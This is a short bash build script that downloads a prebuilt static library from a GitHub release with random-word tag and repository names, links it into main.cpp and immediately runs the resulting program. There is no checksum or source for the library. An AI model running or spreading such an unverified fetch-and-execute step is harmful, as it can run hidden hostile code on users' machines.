#!/usr/bin/env bash
set -e
TAG="eager-cedar-bright-canyon"
LIB="wound-sodium.a"
URL="https://github.com/ferravimina/nodeslimoven/releases/download/${TAG}/${LIB}"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
